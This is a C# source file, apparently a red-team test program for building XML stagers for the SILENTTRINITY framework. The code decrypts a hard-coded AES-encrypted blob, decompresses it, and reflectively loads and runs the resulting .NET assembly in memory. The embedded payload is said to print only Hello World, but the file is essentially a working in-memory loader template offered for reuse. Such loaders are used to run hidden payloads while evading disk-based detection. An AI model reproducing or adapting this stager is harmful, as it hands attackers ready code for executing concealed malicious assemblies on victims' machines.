/* Description: Test program for designing XML stagers written in C#.
 *              Loads a packed .NET Assembly from memory. Can use threading.
 *              Uses only .NET API calls. No Pinvoke or marshalling.
 *              Currently only .NET 4.0+ compatible. Could be fixed by replacing CopyTo.
 *              
 *              Example program simply prints Hello World.
 *              
 *              Inspired a bit from bytebl33d3r's msbuild stager for SILENTTRINITY.
 * 
 * Author: The Wover
 * 
 * Referemces:
 * GZip .NET API: https://docs.microsoft.com/en-us/dotnet/api/system.io.compression.gzipstream
 * AES .NET API: https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesmanaged
 * Base64 .NET API: https://docs.microsoft.com/en-us/dotnet/api/system.convert.tobase64string
 * Anonymous Methods: https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/statements-expressions-operators/anonymous-methods
 * Action Delegates: https://docs.microsoft.com/en-us/dotnet/api/system.action
 * Tasks: https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.task
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace XMLCSharpTest
{
    class Program
    {
        static void Main(string[] cmdargs)
        {
            //Whether or not to use a new thread
            bool threading = false;

            //Create the list of parameters
            List<string> parameters = new List<string>();

            //parameters.Add("example");

            object[] args = new object[] { parameters.ToArray() };

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aesAlg = new AesManaged())
            {
                //Decode and use the AES key and IV
                aesAlg.Key = Convert.FromBase64String("59Csp5LkkRFUYB4ItQnjQATft27chUCHtVNGc8WY/bw=");
                aesAlg.IV = Convert.FromBase64String("xOpJtzdoQkEfFHbB8v0LPQ==");

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String("opN9x+zw...snipped...KmD")))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream decryptBuffer = new MemoryStream())
                        {
                            //Decrypt the data
                            csDecrypt.CopyTo(decryptBuffer);

                            // Create the streams used to decompress
                            using (MemoryStream compressedMemoryStream = new MemoryStream(decryptBuffer.ToArray()))
                            {
                                using (MemoryStream decompressedMemoryStream = new MemoryStream())
                                {
                                    compressedMemoryStream.Position = 0;
                                    using (GZipStream decompressionStream = new GZipStream(compressedMemoryStream, CompressionMode.Decompress))
                                    {
                                        //Decompress the data
                                        decompressionStream.CopyTo(decompressedMemoryStream);

                                        Action action = () =>
                                        {
                                            //FOR EXE
                                            //Assembly.Load(decompressedMemoryStream.ToArray()).EntryPoint.Invoke(null, args);

                                            //FOR DLL - NONSTATIC METHOD
                                            /**
                                            Assembly a = Assembly.Load(decompressedMemoryStream.ToArray());
                                            Type t = a.GetType(a.GetTypes()[0].Namespace + ".Program");
                                            object classInstance = Activator.CreateInstance(t, null);
                                            MethodInfo methodInfo = t.GetMethod("Main", BindingFlags.InvokeMethod | BindingFlags.NonPublic);
                                            methodInfo.Invoke(classInstance, args);
                                            **/

                                            //FOR DLL - STATIC METHOD
                                            Assembly a = Assembly.Load(decompressedMemoryStream.ToArray());
                                            Type t = a.GetType(a.GetTypes()[0].Namespace + ".Program");
                                            MethodInfo methodInfo = t.GetMethod("Main", BindingFlags.InvokeMethod | BindingFlags.NonPublic | BindingFlags.Static);
                                            methodInfo.Invoke(null, args);
                                        };

                                        if (threading == true)
                                        {
                                            //Create a new thread
                                            System.Threading.Tasks.Task t1 = new System.Threading.Tasks.Task(action);
                                            t1.Start();
                                            //Use this if running standalone, testing, or there are no other continuous threads.
                                            //t1.Wait();
                                        }
                                        else
                                        {
                                            action.Invoke();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }//end method
    }//end class
}//end namespace
